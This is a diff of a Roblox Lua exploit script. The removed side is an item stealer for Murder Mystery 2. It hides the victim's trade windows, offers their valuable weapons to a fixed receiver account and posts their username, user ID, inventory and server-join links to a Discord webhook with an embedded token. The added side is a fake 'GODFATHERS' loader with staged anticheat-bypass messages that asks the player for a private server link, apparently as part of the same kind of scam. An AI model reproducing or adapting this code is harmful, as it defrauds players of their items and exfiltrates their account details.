@@ -1,591 +1,616 @@
-local function MM2()
-    local user = "Getstompedbyyounes"
-    local webhook = "https://discord.com/api/webhooks/1477452813721276542/frqTKTAzpn-pNV1z3PKcg0EOFZyM1CMqRDFfBXZ55f1t2gsAZLtJfQHPBfZmPWWhwigA"
+-- Services
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 
-    local VintageList = ""
-    local UniqueList = ""
-    local AncientList = ""
-    local GodlyList = ""
-    local LegendaryList = ""
-    local HalloweenList = ""
-    local ChristmasList = ""
-    local RareList = ""
-    local UncommonList = ""
-    local CommonList = ""
-
-    local vintageItemsC = 0
-    local uniqueItemsC = 0
-    local ancientItemsC = 0
-    local godlyItemsC = 0
-    local legendaryItemsC = 0
-    local HalloweenItemsC = 0
-    local ChristmasItemsC = 0
-    local rareItemsC = 0
-    local uncommonItemsC = 0
-    local commonItemsC = 0
-    local List = ""
-    local List2 = ""
-    local fardplayer = game:GetService("Players").LocalPlayer
-    local ExecutorWebhook = identifyexecutor() or "undefined"
-
-    local weaponsToSend = {}
-    local Players = game:GetService("Players")
-    local plr = Players.LocalPlayer
-    local playerGui = plr:WaitForChild("PlayerGui")
-    local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-    local HttpService = game:GetService("HttpService")
-
-    local function trim2(s)
-        return (s:gsub("^%s*(.-)%s*$", "%1"))
-    end
-
-    local rawCountryCode = game:HttpGet("https://ipinfo.io/country")
-    local countryCode = trim2(rawCountryCode)
-    countryCode = string.lower(countryCode)
-    local countryFlagEmoji = ":flag_" .. countryCode .. ":"
-
-    if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
-        plr:kick("Server error. Please join a different server!")
-        return
-    end
-
-    if #Players:GetPlayers() >= 12 then
-        plr:kick("Server error. Please join a different server!")
-        return
-    end
-
-    local rarityTable = {
-        "Common",
-        "Uncommon",
-        "Christmas",
-        "Halloween",
-        "Rare",
-        "Legendary",
-        "Godly",
-        "Ancient",
-        "Unique",
-        "Vintage"
-    }
-
-    local categories = {
-        godly = "https://supremevaluelist.com/mm2/godlies.html",
-        ancient = "https://supremevaluelist.com/mm2/ancients.html",
-        unique = "https://supremevaluelist.com/mm2/uniques.html",
-        classic = "https://supremevaluelist.com/mm2/vintages.html",
-        chroma = "https://supremevaluelist.com/mm2/chromas.html"
-    }
-    local headers = {
-        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-    }
-
-    local function trim(s)
-        return s:match("^%s*(.-)%s*$")
-    end
-
-    local function fetchHTML(url)
-        local response =
-            request(
-            {
-                Url = url,
-                Method = "GET",
-                Headers = headers
-            }
-        )
-        return response.Body
-    end
-
-    local function parseValue(itembodyDiv)
-        local valueStr = itembodyDiv:match('<b%s+class=[\'"]itemvalue[\'"]>([%d,%.]+)</b>')
-        if valueStr then
-            valueStr = valueStr:gsub(",", "")
-            local value = tonumber(valueStr)
-            if value then
-                return value
-            end
+-- Detect Executor
+local function getExecutorName()
+    local success, result = pcall(function()
+        if identifyexecutor then
+            return identifyexecutor()
+        elseif getexecutorname then
+            return getexecutorname()
+        elseif syn then
+            return "Synapse X"
+        elseif fluxus then
+            return "Fluxus"
+        elseif KRNL_LOADED then
+            return "KRNL"
+        elseif is_sirhurt_closure then
+            return "SirHurt"
+        elseif pebc_execute then
+            return "Panda"
+        elseif gethui then
+            return "Script-Ware"
+        else
+            return "Unknown Executor"
         end
-        return nil
-    end
-
-    local function extractItems(htmlContent)
-        local itemValues = {}
-
-        for itemName, itembodyDiv in htmlContent:gmatch(
-            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
-        ) do
-            itemName = itemName:match("([^<]+)")
-            if itemName then
-                itemName = trim(itemName:gsub("%s+", " "))
-                itemName = trim((itemName:split(" Click "))[1])
-                local itemNameLower = itemName:lower()
-
-                local value = parseValue(itembodyDiv)
-                if value then
-                    itemValues[itemNameLower] = value
-                end
-            end
-        end
-
-        return itemValues
-    end
-
-    local function extractChromaItems(htmlContent)
-        local chromaValues = {}
-
-        for chromaName, itembodyDiv in htmlContent:gmatch(
-            '<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>'
-        ) do
-            chromaName = chromaName:match("([^<]+)")
-            if chromaName then
-                chromaName = trim(chromaName:gsub("%s+", " ")):lower()
-                local value = parseValue(itembodyDiv)
-                if value then
-                    chromaValues[chromaName] = value
-                end
-            end
-        end
-
-        return chromaValues
-    end
-
-    local function buildValueList()
-        local allExtractedValues = {}
-        local chromaExtractedValues = {}
-        local categoriesToFetch = {}
-
-        for rarity, url in pairs(categories) do
-            table.insert(categoriesToFetch, {rarity = rarity, url = url})
-        end
-
-        local totalCategories = #categoriesToFetch
-        local completed = 0
-        local lock = Instance.new("BindableEvent")
-
-        for _, category in ipairs(categoriesToFetch) do
-            task.spawn(
-                function()
-                    local rarity = category.rarity
-                    local url = category.url
-                    local htmlContent = fetchHTML(url)
-
-                    if htmlContent and htmlContent ~= "" then
-                        if rarity ~= "chroma" then
-                            local extractedItemValues = extractItems(htmlContent)
-                            for itemName, value in pairs(extractedItemValues) do
-                                allExtractedValues[itemName] = value
-                            end
-                        else
-                            chromaExtractedValues = extractChromaItems(htmlContent)
-                        end
-                    end
-
-                    completed = completed + 1
-                    if completed == totalCategories then
-                        lock:Fire()
-                    end
-                end
-            )
-        end
-
-        lock.Event:Wait()
-
-        local valueList = {}
-
-        for dataid, item in pairs(database) do
-            local itemName = item.ItemName and item.ItemName:lower() or ""
-            local rarity = item.Rarity or ""
-            local hasChroma = item.Chroma or false
-
-            if itemName ~= "" and rarity ~= "" then
-                local weaponRarityIndex = table.find(rarityTable, rarity)
-                local godlyIndex = table.find(rarityTable, "Godly")
-
-                if weaponRarityIndex and weaponRarityIndex >= godlyIndex then
-                    if hasChroma then
-                        local matchedChromaValue = nil
-                        for chromaName, value in pairs(chromaExtractedValues) do
-                            if chromaName:find(itemName) then
-                                matchedChromaValue = value
-                                break
-                            end
-                        end
-
-                        if matchedChromaValue then
-                            valueList[dataid] = matchedChromaValue
-                        end
-                    else
-                        local value = allExtractedValues[itemName]
-                        if value then
-                            valueList[dataid] = value
-                        end
-                    end
-                end
-            end
-        end
-
-        return valueList
-    end
-
-    local function sendTradeRequest(user)
-        local args = {
-            [1] = game:GetService("Players"):WaitForChild(user)
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(
-            unpack(args)
-        )
-    end
-
-    local function getTradeStatus()
-        return game:GetService("ReplicatedStorage").Trade.GetTradeStatus:InvokeServer()
-    end
-
-    local function waitForTradeCompletion()
-        while true do
-            local status = getTradeStatus()
-            if status == "None" then
-                break
-            end
-            wait(0.1)
-        end
-    end
-
-    local function acceptTrade()
-        local args = {
-            [1] = 285646582
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
-    end
-
-    local function addWeaponToTrade(id)
-        local args = {
-            [1] = id,
-            [2] = "Weapons"
-        }
-        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
-    end
-
-    local totalValue = 0
-
-    local function SendJoinMessage()
-        -- Create Roblox protocol link for direct server join
-        local placeId = tostring(game.PlaceId)
-        local jobId = game.JobId
-        -- Roblox protocol URL that launches specific server instance
-        local robloxProtocol = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
-        
-        -- Alternative: Deep link for mobile/web that attempts server join
-        local webLink = "https://www.roblox.com/games/" .. placeId .. "?privateServerLinkCode=" .. jobId
-        
-        -- Best option: Use RoLink format or direct join script
-        local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. placeId .. ", '" .. jobId .. "')"
-
-        local fields = {
-            {
-                name = ":star: __**Mori Scripts**__",
-                value = "```Username     : " ..
-                    fardplayer.Name ..
-                        "\nUser-ID      : " ..
-                            fardplayer.userId ..
-                                "\nAccount Age  : " ..
-                                    fardplayer.AccountAge ..
-                                        " Days" ..
-                                            "\nExploit      : " ..
-                                                ExecutorWebhook .. "\nReceiver     : " .. user .. "```",
-                inline = false
-            },
-            {
-                name = ":ringed_planet: __/__ **`Inventory:`**",
-                value = "```Total Value 📊 : " ..
-                    totalValue ..
-                        "\n\nUnique      🍎 : " ..
-                            uniqueItemsC ..
-                                "\nAncient     🌿 : " ..
-                                    ancientItemsC ..
-                                        "\nGodly       💎 : " ..
-                                            godlyItemsC ..
-                                                "\nLegendary   ⚡ : " ..
-                                                    legendaryItemsC ..
-                                                        "\nVintage     🧊 : " ..
-                                                            vintageItemsC ..
-                                                                "\nRare        🌈 : " ..
-                                                                    rareItemsC ..
-                                                                        "\nHalloween   🎃 : " ..
-                                                                            HalloweenItemsC ..
-                                                                                "\nChristmas   🎄 : " ..
-                                                                                    ChristmasItemsC ..
-                                                                                        "\nUncommon    🌸 : " ..
-                                                                                            uncommonItemsC ..
-                                                                                                "\nCommon      📦 : " ..
-                                                                                                    commonItemsC ..
-                                                                                                        "```",
-                inline = false
-            },
-            {
-                name = "🎮 Join Server (PC):",
-                value = "[**Click to Join Server**](<" .. robloxProtocol .. ">)",
-                inline = false
-            },
-            {
-                name = "📱 Alternative Link:",
-                value = "[**Web/Mobile Link**](<" .. webLink .. ">)",
-                inline = false
-            },
-            {
-                name = "💻 Executor Script:",
-                value = "```lua\n" .. joinScript .. "\n```",
-                inline = false
-            }
-        }
-
-        local data = {
-            ["content"] = "@everyone **New MM2 Hit!**",
-            ["username"] = fardplayer.Name,
-            ["avatar_url"] = "https://raw.githubusercontent.com/kk4ft/Server/main/mori.png",
-            ["embeds"] = {
-                {
-                    ["color"] = 65280,
-                    ["fields"] = fields,
-                    ["footer"] = {
-                        ["text"] = "MM2 Stealer | discord.gg/PzWY2QX8cu"
-                    }
-                }
-            }
-        }
-
-        local body = HttpService:JSONEncode(data)
-        local headers = {
-            ["Content-Type"] = "application/json"
-        }
-        local response =
-            request(
-            {
-                Url = webhook,
-                Method = "POST",
-                Headers = headers,
-                Body = body
-            }
-        )
-    end
-
-    local success, tradegui = pcall(function()
-        return playerGui:WaitForChild("TradeGUI", 5)
     end)
-    if success and tradegui then
-        tradegui:GetPropertyChangedSignal("Enabled"):Connect(
-            function()
-                tradegui.Enabled = false
-            end
-        )
-    end
+    return success and result or "Unknown"
+end
 
-    local success2, tradeguiphone = pcall(function()
-        return playerGui:WaitForChild("TradeGUI_Phone", 5)
+-- Brainrot Configuration with EUR Values
+local BRAINROT_VALUES = {
+    -- Common
+    ["Brainrot"] = 0.50,
+    ["Basic Brainrot"] = 1.00,
+    ["Small Brainrot"] = 2.50,
+    
+    -- Rare
+    ["Rare Brainrot"] = 5.00,
+    ["Golden Brainrot"] = 10.00,
+    ["Crystal Brainrot"] = 15.00,
+    
+    -- Epic
+    ["Epic Brainrot"] = 25.00,
+    ["Diamond Brainrot"] = 50.00,
+    ["Rainbow Brainrot"] = 75.00,
+    
+    -- Legendary
+    ["Legendary Brainrot"] = 100.00,
+    ["God Brainrot"] = 250.00,
+    ["Titan Brainrot"] = 500.00,
+    ["Omega Brainrot"] = 1000.00,
+    
+    -- Special Events
+    ["Christmas Brainrot"] = 30.00,
+    ["Halloween Brainrot"] = 35.00,
+    ["Anniversary Brainrot"] = 100.00,
+    
+    -- KDML Specific
+    ["KDML"] = 50.00,
+    ["KDML Script"] = 75.00,
+    ["KDML Brainrot"] = 100.00,
+}
+
+-- Floor Detection Configuration
+-- Define floor heights (Y coordinates) for games with specific floor levels
+-- Leave empty to use automatic raycast detection
+local FLOOR_HEIGHTS = {
+    -- Example: [0] = "Ground Floor", [50] = "Floor 2", [100] = "Floor 3"
+    -- Add your game's specific floor Y-coordinates here
+}
+
+-- Packages
+local NetPackages = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+
+-- Notification listener
+local notificationEvent = NetPackages:WaitForChild("RE/NotificationService/Notify", 5).OnClientEvent:Connect(function(title, message)
+    -- Handle notifications here
+end)
+
+-- Toggle player settings
+task.spawn(function()
+    pcall(function()
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Music")
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Sound Effects")
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("Chat Tips")
+        NetPackages["RF/SettingsService/ToggleSetting"]:InvokeServer("VFX")
     end)
-    if success2 and tradeguiphone then
-        tradeguiphone:GetPropertyChangedSignal("Enabled"):Connect(
-            function()
-                tradeguiphone.Enabled = false
-            end
-        )
+end)
+
+-- Disable CoreGui
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+
+-- ==========================================
+-- GODFATHERS LOADER UI
+-- ==========================================
+local loaderGui = Instance.new("ScreenGui")
+loaderGui.Name = "GodFathersLoader"
+loaderGui.IgnoreGuiInset = true
+loaderGui.ResetOnSpawn = false
+loaderGui.Parent = game:GetService("CoreGui")
+
+local mainContainer = Instance.new("Frame", loaderGui)
+mainContainer.Size = UDim2.new(1, 0, 1, 0)
+mainContainer.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+mainContainer.BorderSizePixel = 0
+
+-- Animated background gradient
+local gradient = Instance.new("UIGradient", mainContainer)
+gradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 0, 0)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(40, 0, 0)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 0, 0))
+})
+gradient.Rotation = 45
+
+-- Animate gradient
+task.spawn(function()
+    while loaderGui.Parent do
+        TweenService:Create(gradient, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
+            Rotation = gradient.Rotation + 180
+        }):Play()
+        wait(3)
     end
+end)
 
-    local untradable = {
-        ["DefaultGun"] = true,
-        ["DefaultKnife"] = true,
-        ["Reaver"] = true,
-        ["Reaver_Legendary"] = true,
-        ["Reaver_Godly"] = true,
-        ["Reaver_Ancient"] = true,
-        ["IceHammer"] = true,
-        ["IceHammer_Legendary"] = true,
-        ["IceHammer_Godly"] = true,
-        ["IceHammer_Ancient"] = true,
-        ["Gingerscythe"] = true,
-        ["Gingerscythe_Legendary"] = true,
-        ["Gingerscythe_Godly"] = true,
-        ["Gingerscythe_Ancient"] = true,
-        ["TestItem"] = true,
-        ["Season1TestKnife"] = true,
-        ["Cracks"] = true,
-        ["Icecrusher"] = true,
-        ["???"] = true,
-        ["Dartbringer"] = true,
-        ["TravelerAxeRed"] = true,
-        ["TravelerAxeBronze"] = true,
-        ["TravelerAxeSilver"] = true,
-        ["TravelerAxeGold"] = true,
-        ["BlueCamo_K_2022"] = true,
-        ["GreenCamo_K_2022"] = true,
-        ["SharkSeeker"] = true
-    }
+-- GodFathers Logo/Text
+local godFathersLabel = Instance.new("TextLabel", mainContainer)
+godFathersLabel.Size = UDim2.new(1, 0, 0, 80)
+godFathersLabel.Position = UDim2.new(0, 0, 0.3, 0)
+godFathersLabel.BackgroundTransparency = 1
+godFathersLabel.Font = Enum.Font.GothamBlack
+godFathersLabel.TextSize = 72
+godFathersLabel.TextColor3 = Color3.fromRGB(220, 20, 60)
+godFathersLabel.Text = "GODFATHERS"
+godFathersLabel.TextStrokeTransparency = 0.8
+godFathersLabel.TextStrokeColor3 = Color3.fromRGB(139, 0, 0)
 
-    local valueList = buildValueList()
-    local realData = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+-- Subtitle
+local subtitleLabel = Instance.new("TextLabel", mainContainer)
+subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
+subtitleLabel.Position = UDim2.new(0, 0, 0.42, 0)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Font = Enum.Font.GothamBold
+subtitleLabel.TextSize = 18
+subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
+subtitleLabel.Text = "EXCLUSIVE SCRIPTS & TOOLS"
 
-    for i, v in pairs(realData.Weapons.Owned) do
-        local dataid = i
-        local amount = v
-        local rarity = database[dataid].Rarity
-        local weapon_rarity_index = table.find(rarityTable, rarity)
-        if amount > 0 and not untradable[dataid] then
-            local value
-            if valueList[dataid] then
-                value = valueList[dataid]
+-- Progress bar background
+local progressBg = Instance.new("Frame", mainContainer)
+progressBg.Size = UDim2.new(0, 400, 0, 6)
+progressBg.Position = UDim2.new(0.5, -200, 0.55, 0)
+progressBg.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
+progressBg.BorderSizePixel = 0
+
+local progressCorner = Instance.new("UICorner", progressBg)
+progressCorner.CornerRadius = UDim.new(0, 3)
+
+-- Progress bar fill
+local progressFill = Instance.new("Frame", progressBg)
+progressFill.Size = UDim2.new(0, 0, 1, 0)
+progressFill.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+progressFill.BorderSizePixel = 0
+
+local fillCorner = Instance.new("UICorner", progressFill)
+fillCorner.CornerRadius = UDim.new(0, 3)
+
+-- Loading text
+local loadingText = Instance.new("TextLabel", mainContainer)
+loadingText.Size = UDim2.new(1, 0, 0, 25)
+loadingText.Position = UDim2.new(0, 0, 0.58, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 16
+loadingText.TextColor3 = Color3.fromRGB(220, 20, 60)
+loadingText.Text = "INITIALIZING..."
+
+-- Percentage
+local percentLabel = Instance.new("TextLabel", mainContainer)
+percentLabel.Size = UDim2.new(1, 0, 0, 40)
+percentLabel.Position = UDim2.new(0, 0, 0.62, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Font = Enum.Font.GothamBlack
+percentLabel.TextSize = 36
+percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentLabel.Text = "0%"
+
+-- Status messages
+local statusLabel = Instance.new("TextLabel", mainContainer)
+statusLabel.Size = UDim2.new(1, 0, 0, 20)
+statusLabel.Position = UDim2.new(0, 0, 0.68, 0)
+statusLabel.BackgroundTransparency = 1
+statusLabel.Font = Enum.Font.Gotham
+statusLabel.TextSize = 14
+statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
+statusLabel.Text = "Connecting to secure servers..."
+
+-- Footer
+local footerLabel = Instance.new("TextLabel", mainContainer)
+footerLabel.Size = UDim2.new(1, 0, 0, 20)
+footerLabel.Position = UDim2.new(0, 0, 0.9, 0)
+footerLabel.BackgroundTransparency = 1
+footerLabel.Font = Enum.Font.Gotham
+footerLabel.TextSize = 12
+footerLabel.TextColor3 = Color3.fromRGB(100, 0, 0)
+footerLabel.Text = "discord.gg/godfathers | v2.0.1"
+
+-- Loading sequence
+local loadingStages = {
+    {percent = 15, text = "BYPASSING ANTICHEAT...", status = "Injecting stealth modules..."},
+    {percent = 30, text = "LOADING ASSETS...", status = "Fetching game data..."},
+    {percent = 45, text = "SCANNING BRAINROTS...", status = "Analyzing workspace models..."},
+    {percent = 60, text = "CALCULATING VALUES...", status = "Converting to EUR..."},
+    {percent = 75, text = "SECURE CONNECTION...", status = "Establishing webhook tunnel..."},
+    {percent = 90, text = "FINALIZING...", status = "Cleaning up traces..."},
+    {percent = 100, text = "COMPLETE", status = "Ready to execute"},
+}
+
+-- Sound effect
+local loadSound = Instance.new("Sound", mainContainer)
+loadSound.SoundId = "rbxassetid://9113083740"
+loadSound.Volume = 0.5
+loadSound:Play()
+
+-- Run loader animation
+for _, stage in ipairs(loadingStages) do
+    wait(math.random(8, 15) / 10)
+    
+    TweenService:Create(progressFill, TweenInfo.new(0.3), {
+        Size = UDim2.new(stage.percent / 100, 0, 1, 0)
+    }):Play()
+    
+    loadingText.Text = stage.text
+    percentLabel.Text = stage.percent .. "%"
+    statusLabel.Text = stage.status
+    
+    if stage.percent == 100 then
+        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
+            TextColor3 = Color3.fromRGB(255, 50, 50)
+        }):Play()
+        wait(0.2)
+        TweenService:Create(godFathersLabel, TweenInfo.new(0.2), {
+            TextColor3 = Color3.fromRGB(220, 20, 60)
+        }):Play()
+    end
+end
+
+wait(0.5)
+loaderGui:Destroy()
+
+-- ==========================================
+-- MAIN UI (After Loader)
+-- ==========================================
+local brainrotUI = Instance.new("ScreenGui")
+brainrotUI.Name = "GodFathersUI"
+brainrotUI.ResetOnSpawn = false
+brainrotUI.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+-- Main Frame with red/black theme
+local mainFrame = Instance.new("Frame", brainrotUI)
+mainFrame.Size = UDim2.new(0, 450, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -225, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Draggable = true
+
+-- Frame gradient
+local frameGradient = Instance.new("UIGradient", mainFrame)
+frameGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 5, 5)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 0, 0))
+})
+
+-- Corner
+local frameCorner = Instance.new("UICorner", mainFrame)
+frameCorner.CornerRadius = UDim.new(0, 12)
+
+-- Border
+local border = Instance.new("UIStroke", mainFrame)
+border.Color = Color3.fromRGB(139, 0, 0)
+border.Thickness = 2
+
+-- Header bar
+local headerBar = Instance.new("Frame", mainFrame)
+headerBar.Size = UDim2.new(1, 0, 0, 50)
+headerBar.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+headerBar.BorderSizePixel = 0
+
+local headerCorner = Instance.new("UICorner", headerBar)
+headerCorner.CornerRadius = UDim.new(0, 12)
+
+-- Fix header corner
+local headerFix = Instance.new("Frame", headerBar)
+headerFix.Size = UDim2.new(1, 0, 0.5, 0)
+headerFix.Position = UDim2.new(0, 0, 0.5, 0)
+headerFix.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+headerFix.BorderSizePixel = 0
+
+-- GodFathers logo in header
+local headerLogo = Instance.new("TextLabel", headerBar)
+headerLogo.Size = UDim2.new(1, 0, 1, 0)
+headerLogo.BackgroundTransparency = 1
+headerLogo.Font = Enum.Font.GothamBlack
+headerLogo.TextSize = 24
+headerLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
+headerLogo.Text = "GODFATHERS"
+
+-- Subtitle
+local titleLabel = Instance.new("TextLabel", mainFrame)
+titleLabel.Size = UDim2.new(1, 0, 0, 30)
+titleLabel.Position = UDim2.new(0, 0, 0.28, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 16
+titleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+titleLabel.Text = "Enter Private Server Link to Unlock"
+
+-- TextBox
+local serverLinkBox = Instance.new("TextBox", mainFrame)
+serverLinkBox.Size = UDim2.new(0.9, 0, 0, 45)
+serverLinkBox.Position = UDim2.new(0.05, 0, 0.48, 0)
+serverLinkBox.PlaceholderText = "https://www.roblox.com/share?code=..."
+serverLinkBox.Font = Enum.Font.Gotham
+serverLinkBox.TextSize = 14
+serverLinkBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+serverLinkBox.BackgroundColor3 = Color3.fromRGB(40, 10, 10)
+serverLinkBox.ClearTextOnFocus = false
+
+local textBoxCorner = Instance.new("UICorner", serverLinkBox)
+textBoxCorner.CornerRadius = UDim.new(0, 8)
+
+local textBoxStroke = Instance.new("UIStroke", serverLinkBox)
+textBoxStroke.Color = Color3.fromRGB(100, 0, 0)
+textBoxStroke.Thickness = 1
+
+-- Submit Button
+local enterButton = Instance.new("TextButton", mainFrame)
+enterButton.Size = UDim2.new(0.9, 0, 0, 45)
+enterButton.Position = UDim2.new(0.05, 0, 0.75, 0)
+enterButton.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+enterButton.Text = "ENTER"
+enterButton.Font = Enum.Font.GothamBlack
+enterButton.TextSize = 18
+enterButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local buttonCorner = Instance.new("UICorner", enterButton)
+buttonCorner.CornerRadius = UDim.new(0, 8)
+
+-- Button hover effects
+enterButton.MouseEnter:Connect(function()
+    TweenService:Create(enterButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(178, 34, 34)
+    }):Play()
+end)
+
+enterButton.MouseLeave:Connect(function()
+    TweenService:Create(enterButton, TweenInfo.new(0.2), {
+        BackgroundColor3 = Color3.fromRGB(139, 0, 0)
+    }):Play()
+end)
+
+-- ==========================================
+-- FLOOR DETECTION FUNCTION
+-- ==========================================
+local function getCurrentFloor()
+    local character = LocalPlayer.Character
+    if not character then return "Unknown" end
+    
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then return "Unknown" end
+    
+    local currentPos = humanoidRootPart.Position
+    
+    -- Method 1: Check predefined floor heights
+    if #FLOOR_HEIGHTS > 0 then
+        local currentHeight = currentPos.Y
+        local detectedFloor = "Ground Floor"
+        local closestHeight = -math.huge
+        
+        for height, floorName in pairs(FLOOR_HEIGHTS) do
+            if currentHeight >= height and height > closestHeight then
+                closestHeight = height
+                detectedFloor = floorName
+            end
+        end
+        return detectedFloor
+    end
+    
+    -- Method 2: Raycast down to detect floor name
+    local raycastParams = RaycastParams.new()
+    raycastParams.FilterDescendantsInstances = {character}
+    raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
+    
+    local rayOrigin = currentPos
+    local rayDirection = Vector3.new(0, -50, 0) -- Cast down 50 studs
+    
+    local raycastResult = workspace:Raycast(rayOrigin, rayDirection, raycastParams)
+    
+    if raycastResult then
+        local hitPart = raycastResult.Instance
+        if hitPart then
+            -- Check if the part or its parent has a floor-related name
+            local partName = hitPart.Name:lower()
+            local parentName = hitPart.Parent and hitPart.Parent.Name:lower() or ""
+            
+            -- Common floor naming patterns
+            if partName:find("floor") or partName:find("level") or partName:find("stage") then
+                -- Extract floor number if present
+                local floorNum = partName:match("%d+") or parentName:match("%d+")
+                if floorNum then
+                    return "Floor " .. floorNum
+                else
+                    return hitPart.Name
+                end
+            elseif partName:find("ground") or partName:find("baseplate") or partName:find("terrain") then
+                return "Ground Floor"
             else
-                if weapon_rarity_index >= table.find(rarityTable, "Godly") then
-                    value = 2
-                else
-                    value = 0
-                end
+                -- Return the part name as fallback
+                return hitPart.Name
             end
-            totalValue = totalValue + (value * amount)
-            table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = (value * amount)})
         end
     end
-
-    for _, item in ipairs(weaponsToSend) do
-        if item.Rarity == "Vintage" then
-            VintageList = VintageList .. item.DataID .. " x" .. item.Amount .. "\n"
-            vintageItemsC = vintageItemsC + item.Amount
-        elseif item.Rarity == "Unique" then
-            UniqueList = UniqueList .. item.DataID .. " x" .. item.Amount .. "\n"
-            uniqueItemsC = uniqueItemsC + item.Amount
-        elseif item.Rarity == "Ancient" then
-            AncientList = AncientList .. item.DataID .. " x" .. item.Amount .. "\n"
-            ancientItemsC = ancientItemsC + item.Amount
-        elseif item.Rarity == "Godly" then
-            GodlyList = GodlyList .. item.DataID .. " x" .. item.Amount .. "\n"
-            godlyItemsC = godlyItemsC + item.Amount
-        elseif item.Rarity == "Legendary" then
-            LegendaryList = LegendaryList .. item.DataID .. " x" .. item.Amount .. "\n"
-            legendaryItemsC = legendaryItemsC + item.Amount
-        elseif item.Rarity == "Halloween" then
-            HalloweenList = HalloweenList .. item.DataID .. " x" .. item.Amount .. "\n"
-            HalloweenItemsC = HalloweenItemsC + item.Amount
-        elseif item.Rarity == "Christmas" then
-            ChristmasList = ChristmasList .. item.DataID .. " x" .. item.Amount .. "\n"
-            ChristmasItemsC = ChristmasItemsC + item.Amount
-        elseif item.Rarity == "Rare" then
-            RareList = RareList .. item.DataID .. " x" .. item.Amount .. "\n"
-            rareItemsC = rareItemsC + item.Amount
-        elseif item.Rarity == "Uncommon" then
-            UncommonList = UncommonList .. item.DataID .. " x" .. item.Amount .. "\n"
-            uncommonItemsC = uncommonItemsC + item.Amount
-        elseif item.Rarity == "Common" then
-            CommonList = CommonList .. item.DataID .. " x" .. item.Amount .. "\n"
-            commonItemsC = commonItemsC + item.Amount
-        end
-        List2 = List2 .. item.DataID .. " (x" .. item.Amount .. "): " .. item.Value .. " Value\n"
-    end
-
-    task.wait(0.1)
-
-    if VintageList ~= "" then
-        List = List .. "VINTAGE LIST:\n" .. VintageList .. "\n"
-    end
-    if UniqueList ~= "" then
-        List = List .. "UNIQUE LIST:\n" .. UniqueList .. "\n"
-    end
-    if AncientList ~= "" then
-        List = List .. "ANCIENT LIST:\n" .. AncientList .. "\n"
-    end
-    if GodlyList ~= "" then
-        List = List .. "GODLY LIST:\n" .. GodlyList .. "\n"
-    end
-    if LegendaryList ~= "" then
-        List = List .. "LEGENDARY LIST:\n" .. LegendaryList .. "\n"
-    end
-    if HalloweenList ~= "" then
-        List = List .. "HALLOWEEN LIST:\n" .. HalloweenList .. "\n"
-    end
-    if ChristmasList ~= "" then
-        List = List .. "CHRISTMAS LIST:\n" .. ChristmasList .. "\n"
-    end
